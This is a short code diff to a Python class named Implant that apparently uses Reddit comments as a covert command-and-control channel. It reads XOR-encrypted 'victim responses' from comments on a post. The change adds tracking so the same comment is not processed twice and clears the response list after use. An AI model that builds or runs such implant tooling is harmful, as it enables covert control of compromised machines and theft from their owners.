@@ -66,6 +66,7 @@ class Implant:
         self.listener_id = None
         self.submission = None
         self.comment_id = None
+        self.processed_comments = []
         self.__reddit = None
         self.__subreddit = None
     
@@ -104,12 +105,14 @@ class Implant:
             self.verifySession()
             self.submission.comments.replace_more(limit=None)
             for top_level_comment in self.submission.comments:
-                if("in:" in top_level_comment.body):
+                if("in:" in top_level_comment.body and top_level_comment.id not in self.processed_comments):
                     self.comment_id = top_level_comment.id
+                    self.processed_comments.append(top_level_comment.id)
                     victim_responses.append(top_level_comment.body)
             
         response = victim_responses[0]
         response = response[6:-1]
+        victim_responses.clear()
         
         #decrypt the message
         ciphertext = decrypt(str(response), xor_key)
